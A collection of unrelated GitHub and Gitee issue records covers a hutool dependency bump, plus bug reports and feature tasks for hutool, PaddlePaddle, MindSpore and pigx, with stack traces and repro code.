 Bump hutool-all from 5.7.17 to 5.7.18,Bumps hutool-all from 5.7.17 to 5.7.18. <details> <summary>Release notes</summary> <em>Sourced from hutool-all's releases.</em> 5.7.18 (2021-12-25) 新特性 【core 】 新增CollStreamUtil.groupKeyValue（pr#479@Gitee） 【core 】 新增DatePattern.createFormatter（pr#483@Gitee） 【core 】 增加IdUtil.getSnowflakeNextId（pr#485@Gitee） 【log 】 log4j2的编译依赖改为api，core为test依赖（pr#2019@Github） 【core 】 Img.scale缩小默认使用平滑模式，增加scale方法重载可选模式（issue#I4MY6X@Gitee） 【core 】 excel添加写入图片的方法（pr#486@Gitee） 【core 】 增加CollStreamUtil.groupBy（pr#484@Gitee） 【core 】 增加CollUtil.setValueByMap（pr#482@Gitee） 【core 】 LocalDateTimeUtil增加endOfDay重载（issue#2025@Github） 【core 】 IoCopier增加setFlushEveryBuffer方法（issue#2022@Github） Bug修复 【core 】 LineReadWatcher#onModify文件清空判断问题（issue#2013@Github） 【core 】 修复4位bytes转换float问题（issue#I4M0E4@Gitee） 【core 】 修复CharSequenceUtil.replace问题（issue#I4M16G@Gitee） 【json 】 修复JSONObject 初始化大小值未被使用问题（issue#2016@Github） 【core 】 修复StrUtil.startWith都为null返回错误问题（issue#I4MV7Q@Gitee） 【core 】 修复PasswdStrength检测问题（issue#I4N48X@Gitee） 【core 】 修复UserAgentUtil解析EdgA无法识别问题（issue#I4MCBP@Gitee） 【extra 】 修复Archiver路径前带/问题（issue#I4NS0F@Gitee） 【extra 】 修复getMainColor方法中参数rgbFilters无效问题（pr#2034@Github） 【core 】 修复ChineseDate无法区分闰月问题（issue#I4NQQW@Gitee） 【core 】 修复BeanDesc大小写误判问题（issue#2009@Github） </details> <details> <summary>Changelog</summary> <em>Sourced from hutool-all's changelog.</em> 5.7.18 (2021-12-25) 新特性 【core 】 新增CollStreamUtil.groupKeyValue（pr#479@Gitee） 【core 】 新增DatePattern.createFormatter（pr#483@Gitee） 【core 】 增加IdUtil.getSnowflakeNextId（pr#485@Gitee） 【log 】 log4j2的编译依赖改为api，core为test依赖（pr#2019@Github） 【core 】 Img.scale缩小默认使用平滑模式，增加scale方法重载可选模式（issue#I4MY6X@Gitee） 【core 】 excel添加写入图片的方法（pr#486@Gitee） 【core 】 增加CollStreamUtil.groupBy（pr#484@Gitee） 【core 】 增加CollUtil.setValueByMap（pr#482@Gitee） 【core 】 LocalDateTimeUtil增加endOfDay重载（issue#2025@Github） 【core 】 IoCopier增加setFlushEveryBuffer方法（issue#2022@Github） Bug修复 【core 】 LineReadWatcher#onModify文件清空判断问题（issue#2013@Github） 【core 】 修复4位bytes转换float问题（issue#I4M0E4@Gitee） 【core 】 修复CharSequenceUtil.replace问题（issue#I4M16G@Gitee） 【json 】 修复JSONObject 初始化大小值未被使用问题（issue#2016@Github） 【core 】 修复StrUtil.startWith都为null返回错误问题（issue#I4MV7Q@Gitee） 【core 】 修复PasswdStrength检测问题（issue#I4N48X@Gitee） 【core 】 修复UserAgentUtil解析EdgA无法识别问题（issue#I4MCBP@Gitee） 【extra 】 修复Archiver路径前带/问题（issue#I4NS0F@Gitee） 【extra 】 修复getMainColor方法中参数rgbFilters无效问题（pr#2034@Github） 【core 】 修复ChineseDate无法区分闰月问题（issue#I4NQQW@Gitee） 【core 】 修复BeanDesc大小写误判问题（issue#2009@Github） </details> <details> <summary>Commits</summary> release 5.7.18 fix do update dependency add test fix bug fix bug fix bug add method Merge pull request #2035:ui 包库升级后 是否影响到了前端传值到后台排序（现在无效） from micuncang/v5-dev fix bug Additional commits viewable in compare view </details>   <code>: 157dfff 6db609d 5b43472 f628670 364bca1 4f683f6 f8988ac 246966d e37dfc3 03e3df7
SagaContext回滚 失败,"好像 报错 并没有 回滚 还是 insert 是我事物开启不对嘛?   <code>: SagaContext sagaContext = null; try { sagaContext = SagaContext.sagaContextFactory.current(); logger.info(""多库事物 start------------""); sagaContext.start(); { service.add(bean); int i = 999/0; } sagaContext.commit(); logger.info(""多库事物 commit------------""); } catch (Exception e) { logger.error(""异常回滚"",e); sagaContext.rollback(); }"
Saving all trained params in a single file,"Merging all params in a single file For inference, we will to have 2 files, one for the and one that has all the params together. We look at 1 approach to do this. Understanding save/load ops (C++ side) From the model_format design doc, we see some details in the table but it is not super clear. So we will look at the implementation. To understand the current serialization: we look at In the main work is performed by Code. This function saves a version number, size of LoD and actual LoD data. Then it calls, Code. This function saves a version number, tensor description as a serialized protobuf, and the actual data. The corresponding basically does the deserialization accordingly (respecting the ordering in the ). Understanding how a model is saved (python api) Now, we look at how the save/load works for saving actual model params, we look at the implementation of in fluid. Code. We see that a new program is created with op is appended for each which is persistable. Then the executor runs this program. Approach We basically make two assumptions: For both load/save, the order of iterating over the variables is the same. (This should hopefully be true) We don't worry about the option which is in . While saving: We basically store a number in addition to the actual serialized bytes as in the original . This number will tell us about the size of the serialized LoDTensor in bytes. When the is called for the first time, we will create a file, create a string that will have serialized LoDTensor data. Now we store the size of this string first in a fixed width () number, and then store the string. When the is called later, we basically go to the end of the file, and store 2 things: the size of the string and the string itself. While loading: We pass an additional attribute, in order to load the correct chunk of parameter. So we pass a counter value (which counts from 0 the relative order of the different params). With this counter and the extra size information that we stored, we can hop to the appropriate part of the file, and read the chunk, and deserialize it. For implementation, i think it will be better to have another op for this (rather than replacing the original save_op/load_op, so that is easier to debug, and i don't know the details of how the load_op and save_op are used in distributed version as of now).   <code>: programDesc save_op save_op SerializeToStream( &lt;ofstream&gt;, &lt;framework::LoDTensor&gt;, .. ) SerializeToStream(&lt;ofstream&gt;, &lt;Tensor&gt; ..) load_op save_op save_vars save vars overwrite save_op uint64_t save save uint64_t save"
Paddle will hang using multiply GPU when cuda driver is 367.35,"Issue from gitter chat. When using driver 367.35 and GPU, Paddle will hang when merging gradient, and the NVIDIA nccl benchmarks will hang too. It seems that the driver problems, and same problem occurred in Torch/NCCL(https://github.com/NVIDIA/nccl/issues/39)   <code>: Titan X"
ServletUtils中获取Request为空，报空指针异常,public static ServletRequestAttributes getRequestAttributes() { RequestAttributes attributes = RequestContextHolder.getRequestAttributes(); return (ServletRequestAttributes) attributes; } 上面的方法返回的 ServletRequestAttributes为空，我加了下面的代码才解决，作者你以前不加为啥也没报错呢？能否指点一二。   <code>: /** * RequestContextListener监听器 * @return */ @Bean public RequestContextListener requestContextListenerBean() { return new RequestContextListener(); }
python3下报错,"python3.5 paddle version:1.5.0 models：gnn 复现方法： https://github.com/PaddlePaddle/Paddle/blob/develop/python/paddle/fluid/tests/demo/pipeline_train.py GNN模型的目录：https://github.com/PaddlePaddle/models/tree/develop/fluid/PaddleRec/gnn 流水线训练脚本执行步骤： Step1：将流水线训练demo文件复制到gnn模型目录下 Step2：按照gnn模型的README中的步骤下载数据并进行数据预处理，即如下几个步骤： cd data &amp;&amp; sh download.sh python preprocess.py --dataset diginetica cd .. mkdir gnn_data_new_8/ Step3：运行流水线并行程序进行训练，命令形如： CUDA_VISIBLE_DEVICES=0,1,2,3 python -u pipeline_train.py --lr 0.06 --emb_lr_rate 0.6 &gt; log.txt 2&gt;&amp;1 &amp; 报错如下：   <code>: Traceback (most recent call last): File ""pipeline_train.py"", line 508, in &lt;module&gt; File ""pipeline_train.py"", line 508, in &lt;module&gt; train() File ""pipeline_train.py"", line 350, in train File ""pipeline_train.py"", line 350, in train print_period=1) File ""/opt/_internal/cpython-3.5.1/lib/python3.5/site-packages/paddle/fluid/executor.py"", line 980, in train_from_dataset print_period=print_period) File ""/opt/_internal/cpython-3.5.1/lib/python3.5/site-packages/paddle/fluid/executor.py"", line 787, in _prepare_trainer program._pipeline_opt) File ""/opt/_internal/cpython-3.5.1/lib/python3.5/site-packages/paddle/fluid/trainer_factory.py"", line 36, in _create_trainer File ""/opt/_internal/cpython-3.5.1/lib/python3.5/site-packages/paddle/fluid/trainer_factory.py"", line 36, in _create_trainer trainer = globals()[trainer_class]() File ""/opt/_internal/cpython-3.5.1/lib/python3.5/site-packages/paddle/fluid/trainer_desc.py"", line 109, in __init__ File ""/opt/_internal/cpython-3.5.1/lib/python3.5/site-packages/paddle/fluid/trainer_desc.py"", line 109, in __init__ super(PipelineTrainer, self).__init__() File ""/opt/_internal/cpython-3.5.1/lib/python3.5/site-packages/paddle/fluid/trainer_desc.py"", line 26, in __init__ from proto import trainer_desc_pb2 ImportError: No module named 'proto' Traceback (most recent call last): File ""pipeline_train.py"", line 508, in &lt;module&gt; train() File ""pipeline_train.py"", line 350, in train print_period=1) File ""/opt/_internal/cpython-3.5.1/lib/python3.5/site-packages/paddle/fluid/executor.py"", line 983, in train_from_dataset self._dump_debug_info(program=program, trainer=trainer) File ""/opt/_internal/cpython-3.5.1/lib/python3.5/site-packages/paddle/fluid/executor.py"", line 761, in _dump_debug_info fout.write(trainer._desc()) TypeError: write() argument must be str, not bytes TypeError: write() argument must be str, not bytes"
[CT][MS][generate]MirrorPad int64 2D input core dump on CPU,": /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : python test_net.py core dump pass   <code>: from mindspore.common import Tensor from mindspore.nn import Cell import mindspore.ops.operations as P from mindspore import context context.set_context(mode=context.GRAPH_MODE) input0 = Tensor([[1, 2, 3], [4, 5, 6], [7, 8, 9]]) class Net(Cell): def __init__(self): super().__init__() self.mirrorpad00 = P.MirrorPad(mode='REFLECT') self.paddings = Tensor([[1, 1], [2, 2]]) def construct(self, input0): mirrorpad00_output0 = self.mirrorpad00(input0, self.paddings) return mirrorpad00_output0 net = Net() out1 = net(input0)"
RuntimeUtil命令没有完整执行,"JDK版本： openjdk_8_201 hutool版本： 5.8.6 加了ll后命令没有完整执行 手动在Linux里执行 不加sh -c的也试过，ll单独写的也试过都不行   <code>: System.out.println(RuntimeUtil.execForStr(""sh"",""-c"",""ll /proc/195431""));"
动态图如果不指定 conv2d_transpose 的 output_size 会报错,"动态图中使用 con2d_transpose 时，如果只指定 filter_size ，不指定 output_size ,训练过程会报错：   <code>: ValueError: The conv2d_transpose.filter_size's type must be list or tuple. Received: None"
XmlUtil嵌套bean转换成xml字符串失败,"JDK版本： JDK8 hutool版本： 5.5.9 对于嵌套bean转换成xml字符串失败，最里面那一层bean解析不出来 输出结果 3、期望结果   <code>: package com.example.redisson.demo; import lombok.Data; class RedissonDemoApplicationTests { @Data class Outer { private Inner inner; } @Data class Inner { private String name; private Integer age; } @Test void contextLoads3() throws IOException { Inner inner = new Inner(); inner.setAge(111); inner.setName(""aaa""); Outer outer = new Outer(); outer.setInner(inner); String result = XmlUtil.mapToXmlStr(BeanUtil.beanToMap(outer), ""outer""); System.out.println(result); } } &lt;?xml version=""1.0"" encoding=""UTF-8"" standalone=""no""?&gt; &lt;outer&gt; &lt;inner&gt;RedissonDemoApplicationTests.Inner(name=aaa, age=111)&lt;/inner&gt; &lt;/outer&gt; &lt;?xml version=""1.0"" encoding=""UTF-8"" standalone=""no""?&gt; &lt;outer&gt; &lt;inner&gt; &lt;name&gt;aaa&lt;/name&gt; &lt;age&gt;111&lt;/age&gt; &lt;/inner&gt; &lt;/outer&gt;"
新建角色，前端没有对角色描述做必填校验,pigx版本: 3.1 操作系统: win10 是否修改包名: no 重现步骤： 新建角色，不填 提交 后端报错，提示   <code>: 角色描述不能为空 角色描述 角色描述不能为空
Tons of compile warning with Nvidia cuda9,"Related PR #5956:The Python API about pool2d. Tons of compile warning like: And also use as nvcc parameters.   <code>: /paddle/build/third_party/eigen3/src/extern_eigen3/unsupported/Eigen/CXX11/src/Tensor/TensorReduction.h(587): warning: calling a __host__ function from a __host__ __device__ function is not allowed detected during: instantiation of ""__nv_bool Eigen::TensorEvaluator&lt;const Eigen::TensorReductionOp&lt;Op, Dims, ArgType, MakePointer_&gt;, Device&gt;::evalSubExprsIfNeeded(MakePointer_&lt;Eigen::TensorEvaluator&lt;const Eigen::TensorReductionOp&lt;Op, Dims, ArgType, MakePointer_&gt;, Device&gt;::CoeffReturnType&gt;::Type) [with Op=Eigen::internal::SumReducer&lt;float&gt;, Dims=const Eigen::array&lt;int, 1UL&gt;, ArgType=const Eigen::TensorMap&lt;Eigen::Tensor&lt;const float, 2, 1, Eigen::DenseIndex&gt;, 0, Eigen::MakePointer&gt;, MakePointer_=Eigen::MakePointer, Device=Eigen::GpuDevice]"" /paddle/build/third_party/eigen3/src/extern_eigen3/unsupported/Eigen/CXX11/src/Tensor/TensorMorphing.h(129): here instantiation of ""__nv_bool Eigen::TensorEvaluator&lt;const Eigen::TensorReshapingOp&lt;NewDimensions, ArgType&gt;, Device&gt;::evalSubExprsIfNeeded(Eigen::TensorEvaluator&lt;const Eigen::TensorReshapingOp&lt;NewDimensions, ArgType&gt;, Device&gt;::CoeffReturnType *) [with NewDimensions=const Eigen::array&lt;int, 2UL&gt;, ArgType=const Eigen::TensorReductionOp&lt;Eigen::internal::SumReducer&lt;float&gt;, const Eigen::array&lt;int, 1UL&gt;, const Eigen::TensorMap&lt;Eigen::Tensor&lt;const float, 2, 1, Eigen::DenseIndex&gt;, 0, Eigen::MakePointer&gt;, Eigen::MakePointer&gt;, Device=Eigen::GpuDevice]"" /paddle/build/third_party/eigen3/src/extern_eigen3/unsupported/Eigen/CXX11/src/Tensor/TensorAssign.h(129): here instantiation of ""__nv_bool Eigen::TensorEvaluator&lt;const Eigen::TensorAssignOp&lt;LeftArgType, RightArgType&gt;, Device&gt;::evalSubExprsIfNeeded(Eigen::TensorEvaluator&lt;const Eigen::TensorAssignOp&lt;LeftArgType, RightArgType&gt;, Device&gt;::Scalar *) [with LeftArgType=Eigen::TensorReshapingOp&lt;const Eigen::array&lt;int, 2UL&gt;, Eigen::TensorMap&lt;Eigen::Tensor&lt;float, 2, 1, Eigen::DenseIndex&gt;, 0, Eigen::MakePointer&gt;&gt;, RightArgType=const Eigen::TensorReshapingOp&lt;const Eigen::array&lt;int, 2UL&gt;, const Eigen::TensorReductionOp&lt;Eigen::internal::SumReducer&lt;float&gt;, const Eigen::array&lt;int, 1UL&gt;, const Eigen::TensorMap&lt;Eigen::Tensor&lt;const float, 2, 1, Eigen::DenseIndex&gt;, 0, Eigen::MakePointer&gt;, Eigen::MakePointer&gt;&gt;, Device=Eigen::GpuDevice]"" /paddle/build/third_party/eigen3/src/extern_eigen3/unsupported/Eigen/CXX11/src/Tensor/TensorExecutor.h(251): here instantiation of ""void Eigen::internal::TensorExecutor&lt;Expression, Eigen::GpuDevice, Vectorizable&gt;::run(const Expression &amp;, const Eigen::GpuDevice &amp;) [with Expression=const Eigen::TensorAssignOp&lt;Eigen::TensorReshapingOp&lt;const Eigen::array&lt;int, 2UL&gt;, Eigen::TensorMap&lt;Eigen::Tensor&lt;float, 2, 1, Eigen::DenseIndex&gt;, 0, Eigen::MakePointer&gt;&gt;, const Eigen::TensorReshapingOp&lt;const Eigen::array&lt;int, 2UL&gt;, const Eigen::TensorReductionOp&lt;Eigen::internal::SumReducer&lt;float&gt;, const Eigen::array&lt;int, 1UL&gt;, const Eigen::TensorMap&lt;Eigen::Tensor&lt;const float, 2, 1, Eigen::DenseIndex&gt;, 0, Eigen::MakePointer&gt;, Eigen::MakePointer&gt;&gt;&gt;, Vectorizable=false]"" /paddle/build/third_party/eigen3/src/extern_eigen3/unsupported/Eigen/CXX11/src/Tensor/TensorDevice.h(35): here instantiation of ""Eigen::TensorDevice&lt;ExpressionType, DeviceType&gt; &amp;Eigen::TensorDevice&lt;ExpressionType, DeviceType&gt;::operator=(const OtherDerived &amp;) [with ExpressionType=Eigen::TensorReshapingOp&lt;const Eigen::array&lt;int, 2UL&gt;, Eigen::TensorMap&lt;Eigen::Tensor&lt;float, 2, 1, Eigen::DenseIndex&gt;, 0, Eigen::MakePointer&gt;&gt;, DeviceType=Eigen::GpuDevice, OtherDerived=Eigen::TensorReshapingOp&lt;const Eigen::array&lt;int, 2UL&gt;, const Eigen::TensorReductionOp&lt;Eigen::internal::SumReducer&lt;float&gt;, const Eigen::array&lt;int, 1UL&gt;, const Eigen::TensorMap&lt;Eigen::Tensor&lt;const float, 2, 1, Eigen::DenseIndex&gt;, 0, Eigen::MakePointer&gt;, Eigen::MakePointer&gt;&gt;]"" /paddle/paddle/operators/math/math_function_impl.h(78): here instantiation of ""void paddle::operators::math::ColwiseSum&lt;Place, T&gt;::operator()(const paddle::platform::DeviceContext &amp;, const paddle::framework::Tensor &amp;, paddle::framework::Tensor *) [with Place=paddle::platform::GPUPlace, T=float]"" /paddle/paddle/operators/math/math_function.cu(299): here --expt-relaxed-constexpr &gt; make VERBOSE=1 /usr/local/cuda/bin/nvcc /paddle/paddle/operators/math/math_function.cu -c -o /paddle/build/paddle/operators/math/CMakeFiles/math_function.dir//./math_function_generated_math_function.cu.o -ccbin /usr/bin/cc -m64 -DPADDLE_USE_MKLML -DLAPACK_FOUND -DPADDLE_USE_MKLDNN -DANY_IMPL_ANY_CAST_MOVEABLE -DPADDLE_USE_DSO -DPADDLE_WITH_TESTING -DPADDLE_DISABLE_TIMER -DPADDLE_DISABLE_PROFILER -DPADDLE_WITH_CUDA -DPADDLE_DISABLE_RDMA -DPADDLE_USE_PTHREAD_SPINLOCK -DPADDLE_USE_PTHREAD_BARRIER -DPADDLE_VERSION=0.10.0 -Xcompiler -mavx --expt-relaxed-constexpr -Xcompiler -Wall -Xcompiler -Wextra -Xcompiler -Werror -Xcompiler -fPIC -Xcompiler -fno-omit-frame-pointer -Xcompiler -Wno-unused-parameter -Xcompiler -Wno-unused-function -Xcompiler -Wno-error=sign-compare -Xcompiler -Wno-error=literal-suffix -Xcompiler -Wno-error=unused-local-typedefs -Xcompiler -Wno-error=unused-function -Xcompiler -Wno-error=array-bounds -D_MWAITXINTRIN_H_INCLUDED -D__STRICT_ANSI__ -Wno-deprecated-gpu-targets --expt-relaxed-constexpr -gencode arch=compute_30,code=sm_30 -gencode arch=compute_35,code=sm_35 -gencode arch=compute_50,code=sm_50 -gencode arch=compute_52,code=sm_52 -gencode arch=compute_60,code=sm_60 -gencode arch=compute_61,code=sm_61 -std=c++11 --use_fast_math -Xcompiler -fPIC --expt-relaxed-constexpr -O3 -DNDEBUG -DNVCC -I/usr/local/cuda/include -I/paddle/build/third_party/install/mklml/mklml_lnx_2018.0.1.20171007/include -I/paddle/build/third_party/install/zlib/include -I/paddle/build/third_party/install/gflags/include -I/paddle/build/third_party/install/glog/include -I/paddle/build/third_party/install/gtest/include -I/paddle/build/third_party/install/protobuf/include -I/usr/include/python2.7 -I/usr/local/lib/python2.7/dist-packages/numpy/core/include -I/paddle/build/third_party/install/mkldnn/include -I/paddle/build/third_party/install/warpctc/include -I/paddle/build/third_party/any/src/extern_lib_any -I/paddle/build/third_party/eigen3/src/extern_eigen3 -I/paddle/build/third_party/pybind/src/extern_pybind/include -I/paddle/build/third_party/nccl/src/extern_nccl/src -I/paddle/build/third_party/install/cares/include -I/paddle/build/third_party/install/grpc/include -I/usr/include -I/usr/local/cuda/include -I/paddle/build -I/paddle -I/paddle/paddle/cuda/include -I/paddle/build/proto -I/paddle/build/go/pserver/client/c --expt-relaxed-constexpr"
使用Docker编译Android的PaddlePaddle库，在build开发镜像时下载Go依赖环境失败,使用这些命名创建Docker容器，在最后一条命令时 卡在 之前的下载路径是下面这个，但是因为被墙了，所以才改成上面那个，但是还是卡在这里动不了，然后就死掉了。 有什么办法处理吗？   <code>: $ git clone https://github.com/PaddlePaddle/Paddle.git $ cd Paddle $ docker build -t username/paddle-android:dev . -f Dockerfile.android Step 11/18 : RUN wget -qO- go.tgz https://www.golangtc.com/static/go/1.8.4/go1.8.4.linux-amd64.tar.gz | tar -xz -C /usr/local &amp;&amp; mkdir /root/gopath &amp;&amp; mkdir /root/gopath/bin &amp;&amp; mkdir /root/gopath/src https://storage.googleapis.com/golang/go1.8.1.linux-amd64.tar.gz
【众智】【计算-AICPU开发】SearchSorted,"SearchSorted Tasks AICPU算子适配 + functional接口 + CPU算子迁移 Introduction 搜索有序序列sorted_sequence，返回一个下标列表，这个列表指明了values中对应元素应该插入在input中那个位置上 functional接口（小写加下划线） 接口目录：mindspore/python/mindspore/ops/function/math_func.py 算子原语 接口目录：mindspore/python/mindspore/ops/operations/math_ops.py class SearchSorted(Primitive): 默认值 sorted_sequence Input Int8, Int16, Int32, Int64, Float32, Float64 values input Int8, Int16, Int32, Int64, Float32, Float64 out_int32 Attr Bool False right Attr bool False out Output int32/int64 对应底层算子 默认值 sorted_sequence Input Int8, Int16, Int32, Int64, Float32, Float64 values Input Int8, Int16, Int32, Int64, Float32, Float64 dtype Int Attr DT_INT32 / DT_INT64 DT_INT64 right Bool Attr False/True False out Output int32/int64 对应底层AI CPU算子SearchSorted 对标接口参考 PyTorch1.8.1接口： torch.searchsorted https://pytorch.org/docs/stable/generated/torch.searchsorted.html 3. 异常处理 4. 算子反向 无反向   <code>: def search_sorted(sorted_sequence: tensor, values: tensor, out_int32:bool, right:bool) -&gt; tensor: return out"
"[ST][MS][NET][a2c][pynative][cpu]ValueError: For 'TensorScatterUpdate', the shape of 'update' must be equal to updates_shape_check","a2c网络在CPU环境pynative模式训练失败 / 硬件环境: /device CPU(linux) : -- MindSpore version :r1.9 commit_id:90b3153080 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20220914 MindSpore 版本：编译时间20220917123349 r1.9.0 commit_id:90b3153080 (/): /mode pynative test_ms_usability_benchmark_pynative_gpu_a2c_acc_1p_0001.py cd solution_test/cases/02network/05rl/a2c/pynative pytest -s test_ms_usability_benchmark_pynative_gpu_a2c_acc_1p_0001.py 网络pynative模式训练成功 走给霍新友   <code>: [ERROR] ANALYZER(51261,7fd7a8bd4700,python):2022-09-27-09:00:04.685.344 [mindspore/ccsrc/pipeline/jit/static_analysis/async_eval_result.cc:66] HandleException] Exception happened, check the information as below. The function call stack (See file '/home/zjc/workspace/solution_test/cases/02network/05rl/a2c/pynative/test_ms_usability_benchmark_pynative_cpu_a2c_acc_1p_0001/rank_0/om/analyze_fail.dat' for more details. Get instructions about `analyze_fail.dat` at https://www.mindspore.cn/search?inputValue=analyze_fail.dat): # 0 In file /home/zjc/workspace/solution_test/cases/02network/05rl/a2c/pynative/test_ms_usability_benchmark_pynative_cpu_a2c_acc_1p_0001/src/a2c_trainer.py:53 rewards, states, actions, masks, done_num = self.msrl.agent_act(trainer.COLLECT, state) ^ # 1 In file /home/zjc/workspace/solution_test/cases/02network/05rl/a2c/pynative/test_ms_usability_benchmark_pynative_cpu_a2c_acc_1p_0001/src/a2c.py:122 if phase == 2: # 2 In file /home/zjc/workspace/solution_test/cases/02network/05rl/a2c/pynative/test_ms_usability_benchmark_pynative_cpu_a2c_acc_1p_0001/src/a2c_trainer.py:53 rewards, states, actions, masks, done_num = self.msrl.agent_act(trainer.COLLECT, state) ^ # 3 In file /home/zjc/workspace/solution_test/cases/02network/05rl/a2c/pynative/test_ms_usability_benchmark_pynative_cpu_a2c_acc_1p_0001/src/a2c.py:127 while t &lt; self.loop_size: ^ # 4 In file /home/zjc/workspace/solution_test/cases/02network/05rl/a2c/pynative/test_ms_usability_benchmark_pynative_cpu_a2c_acc_1p_0001/src/a2c.py:139 if done == self.done: # 5 In file /home/zjc/workspace/solution_test/cases/02network/05rl/a2c/pynative/test_ms_usability_benchmark_pynative_cpu_a2c_acc_1p_0001/src/a2c_trainer.py:53 rewards, states, actions, masks, done_num = self.msrl.agent_act(trainer.COLLECT, state) ^ # 6 In file /home/zjc/workspace/solution_test/cases/02network/05rl/a2c/pynative/test_ms_usability_benchmark_pynative_cpu_a2c_acc_1p_0001/src/a2c.py:143 masks[t] = self.mask_done ^ # 7 In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/_compile_utils.py:877 if tensor_dtype == const_utils.INT_: # 8 In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/_compile_utils.py:878 return _tensor_setitem_by_int_tensor_with_tensor(data, index, value_tensor) ^ # 9 In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/_compile_utils.py:853 return F.tensor_scatter_update(data, index, updates) ^ ^M 0%| | 0/10000 [00:06&lt;?, ?it/s] Traceback (most recent call last): File ""train.py"", line 41, in &lt;module&gt; train() File ""train.py"", line 38, in train ac_session.run(class_type=A2CTrainer, episode=episode) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore_rl/core/session.py"", line 91, in run trainer.train(episode, callbacks, ckpt_path) File ""/home/zjc/workspace/solution_test/cases/02network/05rl/a2c/pynative/test_ms_usability_benchmark_pynative_cpu_a2c_acc_1p_0001/src/a2c_trainer.py"", line 39, in train loss, reward = self.train_one_episode() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 594, in staging_specialize out = _MindsporeFunctionExecutor(func, hash_obj, input_signature, process_obj, jit_config)(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 98, in wrapper results = fn(*arg, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 405, in __call__ phase = self.compile(args_list, self.fn.__name__) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 383, in compile is_compile = self._graph_executor.compile(self.obj, compile_args, phase, True) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 577, in __infer__ out[track] = fn(*(x[track] for x in args)) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/operations/array_ops.py"", line 6300, in infer_shape raise ValueError(f""For '{self.name}', the shape of 'update' must be equal to updates_shape_check, "" ValueError: For 'TensorScatterUpdate', the shape of 'update' must be equal to updates_shape_check, where updates_shape_check = indices_shape[:-1] + input_x_shape[indices_shape[-1]:] but got the shape of 'update': [1], updates_shape_check: [1, 1], indices_shape: [1, 1] and input_x_shape: [200, 1]. Please check input_x_shape and indices_shape."
"run ""fit a line"" failed on tag v0.12.0 ","when doing distributed cpu training on k8s, using 2 pservers and 2 trainers, one trainer succeeded and the other trainer failed. the succeeded trainer's log is: the failed trainer's log is: and no errors in pservers' log   <code>: ... [245.54922] [106.66316] [78.47267] [86.7585] [6.032805] ('infer shape: ', (10, 1)) ('infer results: ', array([[-46.680927], [-51.959793], [-33.93647 ], [-31.00824 ], [-38.361206], [-46.148376], [-28.084446], [-35.666855], [-33.81091 ], [-50.53453 ]], dtype=float32)) ... 81.19149] [95.01187] [104.61168] [139.18037] [113.60637] [71.95655] [13.743915] E0523 18:38:30.050364 1005 grpc_client.cc:236] proc param error:name:[fc_0.b_0] ep:[10.255.92.12:30002] grpc error:Deadline Exceeded E0523 18:38:30.051322 1004 grpc_client.cc:236] proc param error:name:[fc_0.w_0] ep:[10.255.93.18:30002] grpc error:Deadline Exceeded Traceback (most recent call last): File ""train.py"", line 175, in &lt;module&gt; main(use_cuda, is_local) File ""train.py"", line 168, in main train(use_cuda, save_dirname, is_local) File ""train.py"", line 121, in train train_loop(t.get_trainer_program()) File ""train.py"", line 85, in train_loop fetch_list=[avg_cost]) File ""/usr/local/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 336, in run self.executor.run(program.desc, scope, 0, True, True) paddle.fluid.core.EnforceNotMet: at [/paddle/paddle/fluid/operators/send_op.cc:82] PaddlePaddle Call Stacks: 0 0x7f9830615566p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 486 1 0x7f9830c754edp paddle::operators::SendOp::RunImpl(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) const + 3197 2 0x7f9830ce5818p paddle::framework::OperatorBase::Run(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) + 56 3 0x7f983069cf90p paddle::framework::Executor::RunPreparedContext(paddle::framework::ExecutorPrepareContext*, paddle::framework::Scope*, bool, bool) + 336 4 0x7f983069d6d4p paddle::framework::Executor::Run(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool) + 100 5 0x7f983062c01bp _ZZN8pybind1112cpp_function10initializeIZNS0_C1IvN6paddle9framework8ExecutorEJRKNS4_11ProgramDescEPNS4_5ScopeEibbEJNS_4nameENS_9is_methodENS_7siblingEEEEMT0_FT_DpT1_EDpRKT2_EUlPS5_S8_SA_ibbE_vJSO_S8_SA_ibbEJSB_SC_SD_EEEvOSF_PFSE_SH_ESN_ENUlRNS_6detail13function_callEE1_4_FUNESV_ + 555 6 0x7f9830625d84p pybind11::cpp_function::dispatcher(_object*, _object*, _object*) + 2596 7 0x7f98c4fe2631p PyEval_EvalFrameEx + 24497 8 0x7f98c4fe3bcep PyEval_EvalCodeEx + 2190 9 